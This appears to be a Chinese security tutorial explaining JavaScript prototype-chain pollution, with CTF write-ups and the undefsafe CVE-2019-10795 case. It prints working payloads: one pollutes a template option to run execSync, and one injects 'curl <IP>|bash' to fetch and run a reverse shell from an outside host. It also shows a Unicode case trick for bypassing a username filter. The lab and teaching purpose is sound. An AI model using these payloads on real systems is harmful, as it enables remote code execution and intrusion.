@@ -1,0 +1,1059 @@
+# 从浅入深 Javascript 原型链与原型链污染
+
+阅读量 **314060**
+
+发布时间 : 2021-06-30 16:30:15
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t014d1d3c67fa390eab.jpg)
+
+## 前言
+
+JavaScript 是一门非常灵活的语言，与 PHP 相比起来更加灵活。除了传统的 SQL
+注入、代码执行等注入型漏洞外，也会有一些独有的安全问题，比如今天要说这个原型链污染。本篇文章就让我们来学习一下 NodeJS 原型链与原型链污染的原理。
+
+## Javascript 原型链与继承
+
+在 JavaScript 中，没有父类和子类这个概念，也没有类和实例的区分，而 JavaScript 中的继承关系则是靠一种叫做 “原型链”
+的模式来实现的。
+
+当我们谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（ `__proto__`）指向它的
+**构造函数的原型对象** （prototype）。该原型对象也有一个自己的原型对象（ `__proto__`），层层向上直到一个对象的原型对象为
+`null`。根据定义，`null` 没有原型，并作为这个原型链中的最后一个环节。我们可以通过以下方式访问得到某一实例对象的原型对象：
+
+    
+    
+    objectname.[[prototype]]
+    objectname.prototype
+    objectname["__proto__"]
+    objectname.__proto__
+    objectname.constructor.prototype
+    
+
+> 在创建对象时，就会有一些预定义的属性。其中在定义函数的时候，这个预定义属性就是 prototype，这个 prototype 是一个普通的原型对象。
+>
+> 而定义普通的对象的时候，就会生成一个 `__proto__`，这个 `__proto__` 指向的是这个对象的构造函数的 prototype。
+
+JavaScript 对象是动态的属性“包”（指其自己的属性）。JavaScript
+对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。
+
+不同对象所生成的原型链如下（部分）：
+
+    
+    
+    var o = {a: 1};
+    // o对象直接继承于 Object.prototype
+    // 原型链: o ---> Object.prototype ---> null
+    
+    var a = ["yo", "whadup", "?"];
+    // 数组都继承于 Array.prototype
+    // 原型链: a ---> Array.prototype ---> Object.prototype ---> null
+    
+    function f(){
+      return 2;
+    }
+    // 函数都继承于 Function.prototype
+    // 原型链: f ---> Function.prototype ---> Object.prototype ---> null
+    
+
+这里演示当尝试访问属性时会发生什么：
+
+    
+    
+    // 让我们从一个函数里创建一个对象o, 它自身拥有属性a和b的:
+    let f = function () {
+       this.a = 1;
+       this.b = 2;
+    }
+    /* 这么写也一样
+    function f() {
+      this.a = 1;
+      this.b = 2;
+    }
+    */
+    let o = new f(); // {a: 1, b: 2}
+    
+    // 在 f 函数的原型对象上定义属性
+    f.prototype.b = 3;
+    f.prototype.c = 4;
+    
+    // 不要在 f 函数的原型上直接定义 f.prototype = {b:3,c:4};, 这样会直接打破原型链
+    // o.[[Prototype]] 有属性 b 和 c
+    //  (其实就是 o.__proto__ 或者 o.constructor.prototype)
+    // o.[[Prototype]].[[Prototype]] 是 Object.prototype.
+    // 最后o.[[Prototype]].[[Prototype]].[[Prototype]]是null
+    // 这就是原型链的末尾，即 null，
+    // 根据定义，null 就是没有 [[Prototype]]。
+    
+    // 综上，整个原型链如下:
+    
+    // {a:1, b:2} ---> {b:3, c:4} ---> Object.prototype---> null
+    
+    console.log(o.a); // 输出 1
+    // a是o的自身属性吗？是的，该属性的值为 1
+    
+    console.log(o.b); // 输出 2
+    // b是o的自身属性吗？是的，该属性的值为 2
+    // 原型上也有一个'b'属性，但是它不会被访问到。
+    // 这种情况被称为"属性遮蔽 (property shadowing)"
+    
+    console.log(o.c); // 输出 4
+    // c是o的自身属性吗？不是，那看看它的原型上有没有
+    // c是o.[[Prototype]]的属性吗？是的，该属性的值为 4
+    
+    console.log(o.d); // 输出 undefined
+    // d 是 o 的自身属性吗？不是，那看看它的原型上有没有
+    // d 是 o.[[Prototype]] 的属性吗？不是，那看看它的原型上有没有
+    // o.[[Prototype]].[[Prototype]] 为 null，停止搜索
+    // 找不到 d 属性，返回 undefined
+    
+
+JavaScript 并没有其他基于类的语言所定义的 “方法”。在 JavaScript 里，任何 **函数**
+都可以添加到对象上作为对象的属性。函数的继承与其他的属性继承没有差别，包括上面的 “属性遮蔽”（这种情况相当于其他语言的方法重写）。
+
+接下来，我们仔细分析一下在下面这些应用场景中， JavaScript 在背后做了哪些事情。
+
+为了最佳的学习体验，我们强烈建议阁下打开浏览器的控制台，进入“console”选项卡，然后运行代码。
+
+    
+    
+    function doSomething(){}
+    console.log(doSomething.prototype);
+    // 和声明函数的方式无关，
+    // JavaScript 中的函数永远有一个默认原型属性。
+    var doSomething = function(){};
+    console.log(doSomething.prototype);
+    
+
+正如之前提到的，在 JavaScript 中，函数（function）是允许拥有属性的。所有的函数会有一个特别的属性 —— `prototype`
+。在控制台显示的JavaScript代码块中，我们可以看到 doSomething 函数的一个默认属性 prototype：
+
+![](https://p3.ssl.qhimg.com/t0189036901a3537ee7.png)
+
+控制台中主要的显示应该类似如下的结果：
+
+    
+    
+    {
+        constructor: ƒ doSomething(),
+        __proto__: {
+            constructor: ƒ Object(),
+            hasOwnProperty: ƒ hasOwnProperty(),
+            isPrototypeOf: ƒ isPrototypeOf(),
+            propertyIsEnumerable: ƒ propertyIsEnumerable(),
+            toLocaleString: ƒ toLocaleString(),
+            toString: ƒ toString(),
+            valueOf: ƒ valueOf()
+        }
+    }
+    
+
+我们可以给 doSomething 函数的原型对象添加新属性，如下：
+
+    
+    
+    function doSomething(){}
+    doSomething.prototype.foo = "bar";
+    console.log(doSomething.prototype);
+    
+
+可以看到运行后的结果如下：
+
+![](https://p3.ssl.qhimg.com/t01d25a6200c03e1731.png)
+
+控制台中主要的显示应该类似如下的结果：
+
+    
+    
+    {
+        foo: "bar",
+        constructor: ƒ doSomething(),
+        __proto__: {
+            constructor: ƒ Object(),
+            hasOwnProperty: ƒ hasOwnProperty(),
+            isPrototypeOf: ƒ isPrototypeOf(),
+            propertyIsEnumerable: ƒ propertyIsEnumerable(),
+            toLocaleString: ƒ toLocaleString(),
+            toString: ƒ toString(),
+            valueOf: ƒ valueOf()
+        }
+    }
+    
+
+现在我们可以通过 new 操作符来创建基于这个原型对象的 doSomething 实例。使用 new 操作符，只需在调用 doSomething
+函数语句之前添加new。这样，便可以获得这个函数的一个实例对象，一些属性就可以添加到该原型对象中。
+
+请尝试运行以下代码：
+
+    
+    
+    function doSomething(){}
+    doSomething.prototype.foo = "bar"; // add a property onto the prototype
+    var doSomeInstancing = new doSomething();
+    doSomeInstancing.prop = "some value"; // add a property onto the object
+    console.log(doSomeInstancing);
+    
+
+可以看到运行后的结果如下：
+
+![](https://p4.ssl.qhimg.com/t0149e78469d3db3985.png)
+
+控制台中主要的显示应该类似如下的结果：
+
+    
+    
+    {
+        prop: "some value",
+        __proto__: {
+            foo: "bar",
+            constructor: ƒ doSomething(),
+            __proto__: {
+                constructor: ƒ Object(),
+                hasOwnProperty: ƒ hasOwnProperty(),
+                isPrototypeOf: ƒ isPrototypeOf(),
+                propertyIsEnumerable: ƒ propertyIsEnumerable(),
+                toLocaleString: ƒ toLocaleString(),
+                toString: ƒ toString(),
+                valueOf: ƒ valueOf()
+            }
+        }
+    }
+    
+
+如上所示，doSomeInstancing 中的 `__proto__` 是 `doSomething.prototype` 。但这是做什么的呢？当你访问
+doSomeInstancing 中的一个属性时，浏览器首先会查看 doSomeInstancing 中是否存在这个属性。
+
+如果 doSomeInstancing 不包含属性信息，那么浏览器会在 doSomeInstancing 的 `__proto__` 中进行查找（同
+`doSomething.prototype`）。如属性在 doSomeInstancing 的 `__proto__` 中查找到，则使用
+doSomeInstancing 中 `__proto__` 的属性。
+
+否则，如果 doSomeInstancing 中 `__proto__` 不具有该属性，则检查 doSomeInstancing 的 `__proto__`
+的 `__proto__` 是否具有该属性，也就是通过 `doSomething.prototype` 的 `__proto__` 即
+`Object.prototype` 来查找该属性。
+
+如果属性不存在 doSomeInstancing 的 `__proto__` 的 `__proto__` 中， 那么就会在doSomeInstancing
+的 `__proto__` 的 `__proto__` 的 `__proto__` 中查找。然而，这里存在个问题：doSomeInstancing 的
+`__proto__` 的 `__proto__` 的 `__proto__` 其实不存在。因此，只有这样，在 `__proto__`
+的整个原型链被查看之后，这里没有更多的 `__proto__` ， 浏览器断言该属性不存在，并给出属性值为 `undefined` 的结论。
+
+## Javascript 原型链污染漏洞原理
+
+我们来看看下面这个语句：
+
+    
+    
+    object[a][b] = value
+    
+
+如果我们可以控制 a、b、value 的值，将 a 设置为`__proto__`，那么我们就可以给 object 对象的原型设置一个 b 属性，值为
+value。这样所有继承 object 对象原型的实例对象就会在本身不拥有 b 属性的情况下，都会拥有b属性，且值为value。
+
+来看一个简单的例子：
+
+    
+    
+    object1 = {"a":1, "b":2};
+    object1.__proto__.foo = "Hello World";
+    console.log(object1.foo);
+    object2 = {"c":1, "d":2};
+    console.log(object2.foo);
+    
+
+![](https://p4.ssl.qhimg.com/t01d41dd13df9af38ec.png)
+
+最终会输出两个 Hello World。为什么 object2 在没有设置 foo 属性的情况下，也会输出 Hello World
+呢？就是因为在第二条语句中，我们对 object1 的原型对象设置了一个 foo 属性，而 object2 和 object1 一样，都是继承了
+Object.prototype。在获取 object2.foo 时，由于 object2 本身不存在 foo 属性，就会往父类
+Object.prototype
+中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。
+
+## Merge 类操作导致原型链污染
+
+Merge 类操作是最常见可能控制键名的操作，也最能被原型链攻击。
+
+给出一个例子：
+
+    
+    
+    function merge(target, source) {
+        for (let key in source) {
+            if (key in source && key in target) {
+                merge(target[key], source[key])
+            } else {
+                target[key] = source[key]
+            }
+        }
+    }
+    
+    let object1 = {}
+    let object2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
+    merge(object1, object2)
+    console.log(object1.a, object1.b)
+    
+    object3 = {}
+    console.log(object3.b)
+    
+
+最终输出的结果为：
+
+    
+    
+    1 2
+    2
+    
+
+可见 object3 的 b 是从原型中获取到的，说明 Object 已经被污染了。这是因为，在 JSON 解析的情况下，`__proto__`
+会被认为是一个真正的 “键名”，而不代表“原型”，所以在遍历 object2 的时候会存在这个键，所以 Object 理所应当的便被污染了。
+
+下面分析一下 Merge() 为什么不安全：
+
+  * 这个函数对 `source` 对象中的所有属性进行迭代（因为对象 `source` 在键值对相同的情况下拥有更高的优先级）
+  * 如果属性同时存在于第一个和第二个参数中，且他们都是 `Object`，它就会递归地合并这个属性。
+  * 现在我们如果控制 `source[key]` 的值，使其值变成 `__proto__`，且我们能控制 `source` 中 `__proto__` 属性的值，在递归的时候，`target[key]` 在某个特定的时候就会指向对象 `target` 的 `prototype`，我们就能成功地添加一个新的属性到该对象的原型链中了。
+
+这就是最典型的一个原型链污染的例子，下面我们看几道 CTF 中原型链污染的例题。
+
+###  [GYCTF2020]Ez_Express
+
+进入题目，一个登录框：
+
+![](https://p0.ssl.qhimg.com/t015c85f9de1cecd2b1.png)
+
+下载 `www.zip` 得到源码，然后对源码进行审计，`routes` 路径下有个 index.js：
+
+    
+    
+    var express = require('express');
+    var router = express.Router();
+    const isObject = obj => obj && obj.constructor && obj.constructor === Object;
+    
+    const merge = (a, b) => {    // 发现 merge 危险操作
+      for (var attr in b) {
+        if (isObject(a[attr]) && isObject(b[attr])) {
+          merge(a[attr], b[attr]);
+        } else {
+          a[attr] = b[attr];
+        }
+      }
+      return a
+    }
+    const clone = (a) => {
+      return merge({}, a);
+    }
+    function safeKeyword(keyword) {
+      if(keyword.match(/(admin)/is)) {
+          return keyword
+      }
+    
+      return undefined
+    }
+    
+    router.get('/', function (req, res) {
+      if(!req.session.user){
+        res.redirect('/login');
+      }
+      res.outputFunctionName=undefined;
+      res.render('index',data={'user':req.session.user.user});
+    });
+    
+    
+    router.get('/login', function (req, res) {
+      res.render('login');
+    });
+    
+    
+    router.post('/login', function (req, res) {
+      if(req.body.Submit=="register"){
+       if(safeKeyword(req.body.userid)){
+        res.end("<script>alert('forbid word');history.go(-1);</script>") 
+       }
+        req.session.user={
+          'user':req.body.userid.toUpperCase(),    // 变成大写
+          'passwd': req.body.pwd,
+          'isLogin':false
+        }
+        res.redirect('/'); 
+      }
+      else if(req.body.Submit=="login"){
+        if(!req.session.user){res.end("<script>alert('register first');history.go(-1);</script>")}
+        if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
+          req.session.user.isLogin=true;
+        }
+        else{
+          res.end("<script>alert('error passwd');history.go(-1);</script>")
+        }
+    
+      }
+      res.redirect('/');
+    });
+    router.post('/action', function (req, res) {    // /action 路由只能 admin 用户访问
+      if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
+      req.session.user.data = clone(req.body);    // 使用了之前定义的 merge 危险操作
+      res.end("<script>alert('success');history.go(-1);</script>");  
+    });
+    router.get('/info', function (req, res) {
+      res.render('index',data={'user':res.outputFunctionName});
+    })
+    module.exports = router;
+    
+
+源码中用了 `merge()` 和 `clone()`，那必定是原型链污染了。往下找到调用 `clone()` 的位置：
+
+    
+    
+    router.post('/action', function (req, res) {    // /action路由只能admin用户访问
+      if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
+      req.session.user.data = clone(req.body);    // 使用了之前定义的危险的merge操作
+      res.end("<script>alert('success');history.go(-1);</script>");  
+    });
+    
+
+可见，当我们登上 admin 用户后，便可以发送 POST 数据来进行原型链污染了。但是要污染哪一个参数呢，我们继续向下看到 /info 路由：
+
+    
+    
+    router.get('/info', function (req, res) {
+      res.render('index',data={'user':res.outputFunctionName});
+    })
+    
+
+可以看到在 `/info` 下，将 res 对象中的 `outputFunctionName` 属性渲染入 `index` 中，而
+`outputFunctionName` 是未定义的：
+
+    
+    
+    res.outputFunctionName=undefined;
+    
+
+所以我们就污染 `outputFunctionName` 属性吧。
+
+但是需要admin账号才能用到 `clone()`，于是去到 `/login` 路由处：
+
+    
+    
+    router.post('/login', function (req, res) {
+      if(req.body.Submit=="register"){
+       if(safeKeyword(req.body.userid)){    // 注册的用户的userid不能是admin
+        res.end("<script>alert('forbid word');history.go(-1);</script>") 
+       }
+        req.session.user={
+          'user':req.body.userid.toUpperCase(),    // 变成大写
+          'passwd': req.body.pwd,
+          'isLogin':false
+        }
+        res.redirect('/'); 
+      }
+      else if(req.body.Submit=="login"){
+        if(!req.session.user){res.end("<script>alert('register first');history.go(-1);</script>")}
+        if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
+          req.session.user.isLogin=true;
+        }
+        else{
+          res.end("<script>alert('error passwd');history.go(-1);</script>")
+        }
+    
+      }
+      res.redirect('/'); ;
+    });
+    
+
+可以看到注册的用户名不能为 admin（大小写），不过有个地方可以注意到：
+
+    
+    
+    'user':req.body.userid.toUpperCase(),
+    
+
+这里将user给转为大写了，这种转编码的通常都很容易出问题，具体请参考 p 牛的文章
+[《Fuzz中的javascript大小写特性》](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)
+
+我们可以注册一个 `admın`（此admın非彼admin，仔细看i部分）：
+
+> 特殊字符绕过：
+>
+> **toUpperCase()**
+>
+> 我们可以在其中混入了两个奇特的字符”ı”、”ſ”。这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() ==
+> ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。
+>
+> **toLowerCase()**
+>
+> 这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.
+
+注册后成功登录admin用户：
+
+![](https://p0.ssl.qhimg.com/t01333e2d2cb434ec4f.png)
+
+让我们输入自己最喜欢的语言，这里我们就可以发送 Payload 进行原型链污染了：
+
+    
+    
+    {"lua":"123","__proto__":{"outputFunctionName":"t=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"},"Submit":""}
+    
+
+输入后抓包：
+
+![](https://p3.ssl.qhimg.com/t019ab30fb60ca66e4a.png)
+
+并将 Content-Type 设为 application/json，POST Body 部分改为 Json 格式的数据并加上Payload：
+
+![](https://p5.ssl.qhimg.com/t017db407f83004c910.png)
+
+然后访问 /info 路由即可得到flag：
+
+![](https://p5.ssl.qhimg.com/t01508ddaad5203a283.png)
+
+###  Nullcon HackIM
+
+再来看看 Nullcon HackIM 中的一个例子：
+
+    
+    
+    'use strict';
+    
+    const express = require('express');
+    const bodyParser = require('body-parser')
+    const cookieParser = require('cookie-parser');
+    const path = require('path');
+    
+    
+    const isObject = obj => obj && obj.constructor && obj.constructor === Object;
+    
+    function merge(a, b) {
+        for (var attr in b) {
+            if (isObject(a[attr]) && isObject(b[attr])) {
+                merge(a[attr], b[attr]);
+            } else {
+                a[attr] = b[attr];
+            }
+        }
+        return a
+    }
+    
+    function clone(a) {
+        return merge({}, a);
+    }
+    
+    // Constants
+    const PORT = 8080;
+    const HOST = '0.0.0.0';
+    const admin = {};
+    
+    // App
+    const app = express();
+    app.use(bodyParser.json())    // 调用中间件解析json
+    app.use(cookieParser());
+    
+    app.use('/', express.static(path.join(__dirname, 'views')));
+    app.post('/signup', (req, res) => {
+        var body = JSON.parse(JSON.stringify(req.body));
+        var copybody = clone(body)
+        if (copybody.name) {
+            res.cookie('name', copybody.name).json({
+                "done": "cookie set"
+            });
+        } else {
+            res.json({
+                "error": "cookie not set"
+            })
+        }
+    });
+    app.get('/getFlag', (req, res) => {
+        var аdmin = JSON.parse(JSON.stringify(req.cookies))
+        if (admin.аdmin == 1) {
+            res.send("hackim19{}");
+        } else {
+            res.send("You are not authorized");
+        }
+    });
+    app.listen(PORT, HOST);
+    console.log(`Running on http://${HOST}:${PORT}`);
+    
+
+代码很简单，还是使用了 Merge 危险操作，存在原型链污染，因此最简单的 Payload 就是：
+
+    
+    
+    {"__proto__": {"admin": 1}}
+    
+
+## Undefsafe 模块原型链污染（CVE-2019-10795）
+
+不光是 Merge 操作容易造成原型链污染，undefsafe 模块也可以原型链污染。undefsafe 是 Nodejs
+的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（<
+2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性。
+
+###  undefsafe 模块使用
+
+我们先简单测试一下该模块的使用：
+
+    
+    
+    var object = {
+        a: {
+            b: {
+                c: 1,
+                d: [1,2,3],
+                e: 'skysec'
+            }
+        }
+    };
+    console.log(object.a.b.e)
+    // skysec
+    
+
+可以看到当我们正常访问object属性的时候会有正常的回显，但当我们访问不存在属性时则会得到报错：
+
+    
+    
+    console.log(object.a.c.e)
+    // TypeError: Cannot read property 'e' of undefined
+    
+
+在编程时，代码量较大时，我们可能经常会遇到类似情况，导致程序无法正常运行，发送我们最讨厌的报错。那么 undefsafe 可以帮助我们解决这个问题：
+
+    
+    
+    var a = require("undefsafe");
+    
+    console.log(a(object,'a.b.e'))
+    // skysec
+    console.log(object.a.b.e)
+    // skysec
+    console.log(a(object,'a.c.e'))
+    // undefined
+    console.log(object.a.c.e)
+    // TypeError: Cannot read property 'e' of undefined
+    
+
+那么当我们无意间访问到对象不存在的属性时，就不会再进行报错，而是会返回 undefined 了。
+
+同时在对对象赋值时，如果目标属性存在：
+
+    
+    
+    var a = require("undefsafe");
+    var object = {
+        a: {
+            b: {
+                c: 1,
+                d: [1,2,3],
+                e: 'skysec'
+            }
+        }
+    };
+    console.log(object)
+    // { a: { b: { c: 1, d: [Array], e: 'skysec' } } }
+    a(object,'a.b.e','123')
+    console.log(object)
+    // { a: { b: { c: 1, d: [Array], e: '123' } } }
+    
+
+我们可以看到，其可以帮助我们修改对应属性的值。如果当属性不存在时，我们想对该属性赋值：
+
+    
+    
+    var a = require("undefsafe");
+    var object = {
+        a: {
+            b: {
+                c: 1,
+                d: [1,2,3],
+                e: 'skysec'
+            }
+        }
+    };
+    console.log(object)
+    // { a: { b: { c: 1, d: [Array], e: 'skysec' } } }
+    a(object,'a.f.e','123')
+    console.log(object)
+    // { a: { b: { c: 1, d: [Array], e: 'skysec' }, e: '123' } }
+    
+
+访问属性会在上层进行创建并赋值。
+
+###  undefsafe 模块漏洞分析
+
+通过以上演示我们可知，undefsafe 是一款支持设置值的函数。但是 undefsafe
+模块在小于2.0.3版本，存在原型链污染漏洞（CVE-2019-10795）。
+
+我们在 2.0.3 版本中进行测试：
+
+    
+    
+    var a = require("undefsafe");
+    var object = {
+        a: {
+            b: {
+                c: 1,
+                d: [1,2,3],
+                e: 'skysec'
+            }
+        }
+    };
+    var payload = "__proto__.toString";
+    a(object,payload,"evilstring");
+    console.log(object.toString);
+    // [Function: toString]
+    
+
+但是如果在低于 2.0.3 版本运行，则会得到如下输出：
+
+    
+    
+    var a = require("undefsafe");
+    var object = {
+        a: {
+            b: {
+                c: 1,
+                d: [1,2,3],
+                e: 'skysec'
+            }
+        }
+    };
+    var payload = "__proto__.toString";
+    a(object,payload,"evilstring");
+    console.log(object.toString);
+    //evilstring
+    
+
+可见，当 undefsafe() 函数的第 2，3 个参数可控时，我们可以污染 object 对象中的值。
+
+再来看一个简单例子：
+
+    
+    
+    var a = require("undefsafe");
+    var test = {}
+    console.log('this is '+test)    // 将test对象与字符串'this is '进行拼接
+    // this is [object Object]
+    
+
+返回：[object Object]，并与this is进行拼接。但是当我们使用 undefsafe 的时候，可以对原型进行污染：
+
+    
+    
+    a(test,'__proto__.toString',function(){ return 'just a evil!'})
+    console.log('this is '+test)    // 将test对象与字符串'this is '进行拼接
+    // this is just a evil!
+    
+
+可以看到最终输出了 “this is just a
+evil!”。这就是因为原型链污染导致，当我们将对象与字符串拼接时，即将对象当做字符串使用时，会自动其触发 toString
+方法。但由于当前对象中没有，则回溯至原型中寻找，并发现toString方法，同时进行调用，而此时原型中的toString方法已被我们污染，因此可以导致其输出被我们污染后的结果。
+
+下面我们来看一道例题。
+
+###  [网鼎杯 2020 青龙组]notes
+
+![](https://p1.ssl.qhimg.com/t0158ebb26d24993b84.png)
+
+题目给了源码：
+
+    
+    
+    var express = require('express');
+    var path = require('path');
+    const undefsafe = require('undefsafe');
+    const { exec } = require('child_process');
+    
+    var app = express();
+    class Notes {
+        constructor() {
+            this.owner = "whoknows";
+            this.num = 0;
+            this.note_list = {};    // 定义了一个字典，在后面的攻击过程中会用到
+        }
+    
+        write_note(author, raw_note) {
+            this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
+        }
+    
+        get_note(id) {
+            var r = {}
+            undefsafe(r, id, undefsafe(this.note_list, id));
+            return r;
+        }
+    
+        edit_note(id, author, raw) {
+            undefsafe(this.note_list, id + '.author', author);
+            undefsafe(this.note_list, id + '.raw_note', raw);
+        }
+    
+        get_all_notes() {
+            return this.note_list;
+        }
+    
+        remove_note(id) {
+            delete this.note_list[id];
+        }
+    }
+    
+    var notes = new Notes();
+    notes.write_note("nobody", "this is nobody's first note");
+    
+    
+    app.set('views', path.join(__dirname, 'views'));
+    app.set('view engine', 'pug');    // 设置模板引擎为pug
+    
+    app.use(express.json());
+    app.use(express.urlencoded({ extended: false }));
+    app.use(express.static(path.join(__dirname, 'public')));
+    
+    
+    app.get('/', function(req, res, next) {
+      res.render('index', { title: 'Notebook' });
+    });
+    
+    app.route('/add_note')
+        .get(function(req, res) {
+            res.render('mess', {message: 'please use POST to add a note'});
+        })
+        .post(function(req, res) {
+            let author = req.body.author;
+            let raw = req.body.raw;
+            if (author && raw) {
+                notes.write_note(author, raw);
+                res.render('mess', {message: "add note sucess"});
+            } else {
+                res.render('mess', {message: "did not add note"});
+            }
+        })
+    
+    app.route('/edit_note')    // 该路由中 undefsafe 三个参数均可控
+        .get(function(req, res) {
+            res.render('mess', {message: "please use POST to edit a note"});
+        })
+        .post(function(req, res) {
+            let id = req.body.id;
+            let author = req.body.author;
+            let enote = req.body.raw;
+            if (id && author && enote) {
+                notes.edit_note(id, author, enote);
+                res.render('mess', {message: "edit note sucess"});
+            } else {
+                res.render('mess', {message: "edit note failed"});
+            }
+        })
+    
+    app.route('/delete_note')
+        .get(function(req, res) {
+            res.render('mess', {message: "please use POST to delete a note"});
+        })
+        .post(function(req, res) {
+            let id = req.body.id;
+            if (id) {
+                notes.remove_note(id);
+                res.render('mess', {message: "delete done"});
+            } else {
+                res.render('mess', {message: "delete failed"});
+            }
+        })
+    
+    app.route('/notes')
+        .get(function(req, res) {
+            let q = req.query.q;
+            let a_note;
+            if (typeof(q) === "undefined") {
+                a_note = notes.get_all_notes();
+            } else {
+                a_note = notes.get_note(q);
+            }
+            res.render('note', {list: a_note});
+        })
+    
+    app.route('/status')    // 漏洞点，只要将字典 commands 给污染了, 就能任意执行我们的命令
+        .get(function(req, res) {
+            let commands = {
+                "script-1": "uptime",
+                "script-2": "free -m"
+            };
+            for (let index in commands) {
+                exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
+                    if (err) {
+                        return;
+                    }
+                    console.log(`stdout: ${stdout}`);    // 将命令执行结果输出
+                });
+            }
+            res.send('OK');
+            res.end();
+        })
+    
+    
+    app.use(function(req, res, next) {
+      res.status(404).send('Sorry cant find that!');
+    });
+    
+    
+    app.use(function(err, req, res, next) {
+      console.error(err.stack);
+      res.status(500).send('Something broke!');
+    });
+    
+    
+    const port = 8080;
+    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
+    
+
+我们注意到其使用了 undefsafe 模块，那么如果我们可以操纵其第 2、3 个参数，即可进行原型链污染，则可使目标网站存在风险。故此，我们首先要寻找
+undefsafe 的调用点：
+
+    
+    
+    get_note(id) {
+        var r = {}
+        undefsafe(r, id, undefsafe(this.note_list, id));
+        return r;
+    }
+    
+    edit_note(id, author, raw) {
+        undefsafe(this.note_list, id + '.author', author);
+        undefsafe(this.note_list, id + '.raw_note', raw);
+    }
+    
+
+发现在查看 note 和编辑 note 时会调用 undefsafe，那我们首先查看 get_note 方法会被哪个路由调用：
+
+    
+    
+    app.route('/notes')
+        .get(function(req, res) {
+            let q = req.query.q;
+            let a_note;
+            if (typeof(q) === "undefined") {
+                a_note = notes.get_all_notes();
+            } else {
+                a_note = notes.get_note(q);
+            }
+            res.render('note', {list: a_note});
+        })
+    
+
+发现此时虽然 q 参数可控，但是也只有 q 参数可控，也就是说我们只能控制 undefsave 函数的第二个参数，而 undefsave
+函数的第三个参数我们控制不了。
+
+而对于 edit_note 方法，我们发现 edit_note 路由中会调用 edit_note 方法：
+
+    
+    
+    app.route('/edit_note')
+        .get(function(req, res) {
+            res.render('mess', {message: "please use POST to edit a note"});
+        })
+        .post(function(req, res) {
+            let id = req.body.id;
+            let author = req.body.author;
+            let enote = req.body.raw;
+            if (id && author && enote) {
+                notes.edit_note(id, author, enote);
+                res.render('mess', {message: "edit note sucess"});
+            } else {
+                res.render('mess', {message: "edit note failed"});
+            }
+        })
+    
+
+此时 id、author 和 raw 均为我们的可控值，那么我们则可以操纵原型链进行污染：
+
+    
+    
+        edit_note(id, author, raw) {
+            undefsafe(this.note_list, id + '.author', author);
+            undefsafe(this.note_list, id + '.raw_note', raw);
+        }
+    
+
+那么既然找到了可以进行原型链污染的位置，就要查找何处可以利用污染的值造成攻击，我们依次查看路由，发现 /status 路由有命令执行的操作：
+
+    
+    
+    app.route('/status')    // 漏洞点，只要将字典commands给污染了，就能执行我们的任意命令
+        .get(function(req, res) {
+            let commands = {
+                "script-1": "uptime",
+                "script-2": "free -m"
+            };
+            for (let index in commands) {
+                exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
+                    if (err) {
+                        return;
+                    }
+                    console.log(`stdout: ${stdout}`);    // 将命令执行结果输出
+                });
+            }
+            res.send('OK');
+            res.end();
+        })
+    
+
+那我们的思路就来了，我们可以通过 /edit_note 路由污染 note_list 对象的原型，比如加入某个命令，由于 commands 和
+note_list 都继承自同一个原型，那么在遍历 commands 时便会取到我们污染进去的恶意命令并执行。
+
+在 VPS 上面创建一个反弹 Shell 的文件，然后等待目标主机去 Curl 访问并执行他：
+
+![](https://p3.ssl.qhimg.com/t01ff3d731336dacd48.png)
+
+在目标主机执行 Payload：
+
+    
+    
+    POST /edit_note
+    
+    id=__proto__.aaa&author=curl 47.101.57.72|bash&raw=lalala;
+    
+
+![](https://p3.ssl.qhimg.com/t011ceb669ff1f67104.png)
+
+再访问 /status 路由，利用污染后的结果进行命令执行，成功反弹 Shell 并得到 flag：
+
+![](https://p2.ssl.qhimg.com/t019abe20f714d7338b.png)
+
+## Ending……
+
+> 参考：
+>
+> <https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-> attack.html#0x01-prototype__proto__>
+>
+> <https://developer.mozilla.org/zh-> CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain>
+>
+> <https://xz.aliyun.com/t/7184>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **WHOAMI** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/242645](/post/id/242645)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+  * [Web](/tag/Web)
+
+ **+1** __5赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/g?b=oidb&k=HN3c2Tzia2RGtxxlcskYgyw&s=40&t=1575959591)
+WHOAMI
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
